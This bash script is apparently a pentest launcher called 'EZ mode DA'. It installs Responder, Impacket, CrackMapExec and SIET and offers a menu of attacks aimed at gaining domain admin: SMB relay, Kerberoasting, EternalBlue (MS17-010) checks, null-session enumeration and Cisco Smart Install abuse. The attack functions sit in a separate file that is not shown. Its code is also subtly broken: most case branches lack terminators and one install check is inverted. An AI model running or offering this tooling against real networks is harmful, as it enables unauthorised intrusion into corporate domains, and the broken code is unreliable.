#!/bin/bash

#####
# This script checks for some common attack paths to get DA from a Linux host
# already on the network. Fire this thing off on Monday morning, grab a coffee,
# and come back to a few attack paths to head down.
#
# By: Matt Hand (@matterpreter)
# S/O to: Shane Young (@x90skysn3k), Steve Laura
#####

source ./attacks.sh

# Colors make this more l33t
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' # No color

# Check if required tools exist. Only supporting tools in /opt but this is easy
# to change
if [[ ! -d "/opt/Responder/" ]]; then
  echo "[-] Couldn't find Responder. Installing now..."
  git clone https://github.com/lgandx/Responder.git /opt/Responder
  # Need to install Responder as well
fi
if [[ ! -d "/opt/impacket/" ]]; then
  echo "[-] Couldn't find Impacket. Installing now..."
  git clone https://github.com/CoreSecurity/impacket.git /opt/impacket
fi
if ! cme_loc="$(type -p cme)" || [ -d "/opt/CrackMapExec/" ]; then
  echo "[-] Couldn't find CME. Installing now..."
  git clone https://github.com/byt3bl33d3r/CrackMapExec.git /opt/CrackMapExec
fi
if [[ ! -d "/opt/SIET/" ]]; then
  echo "[-] Couldn't find SIET. Installing now..."
  git clone https://github.com/Sab0tag3d/SIET.git /opt/SIET
fi
if ! rpcclient_loc="$(type -p rpcclient)"; then # Don't know where this would be the case, but who knows
  echo "[-] Couldn't find rpcclient. Installing now..."
  apt install rpcclient
fi
if ! nmap_loc="$(type -p nmap)"; then
  echo "[-] Couldn't find nmap. Installing now..."
  apt install nmap
fi
if ! masscan_loc="$(type -p masscan)"; then
  echo "[-] Couldn't find masscan. Installing now..."
  apt install masscan
fi


echo "${RED}------------------------------------------------${NC}"
echo "${RED}-------------------${GREEN}}EZ mode DA${RED}-------------------${NC}"
echo "${RED}--------------------${GREEN}v0.1beta${RED}--------------------${NC}"
echo "${RED}------------------------------------------------${NC}"
echo "Currently supported vectors to check:"
echo "1) SMB Relay" # Done
echo "2) Kerberoast" # Done
echo "3) MS17-010 (EternalBlue)" # In Prggress
echo "4) Null Session Enumeration" # In Progress
echo "5) Cisco Smart Install" # Done
echo "0) All of the above"

read -p "Option: " OPTION

echo "Before we get started, enter file containing your targets (/root/targets.txt):"
read TARGETSFILE

case "$OPTION" in
  1)  echo "[+] Checking if a SMB relay attack is viable"
      smbRelay $TARGETSFILE
  2)  echo "[+] Getting ready to kerberoast"
      kerberoast
  3)  echo "[+] Checking for MS17-010"
      ms17-010 $TARGETSFILE
  4)  echo "[+] Attempting to get usernames via null sessions"
      nullSessionEnum
  5)  echo "[+] Checking for hosts with Cisco Smart Install enabled"
      smartInstall $TARGETSFILE
  0)  echo "[+] Running all checks."
      echo "[+] Checking if a SMB relay attack is viable"
      smbRelay $TARGETSFILE
      echo "[+] Getting ready to kerberoast"
      kerberoast
      echo "[+] Checking hosts for MS17-010"
      ms17-010 $TARGETSFILE
      echo "[+] Checking for null session enumeration"
      nullSessionEnum
      echo "[+] Checking for Cisco Smart Install"
      smartInstall $TARGETSFILE
  *) echo "That is not a valid option. Try again.";;
esac
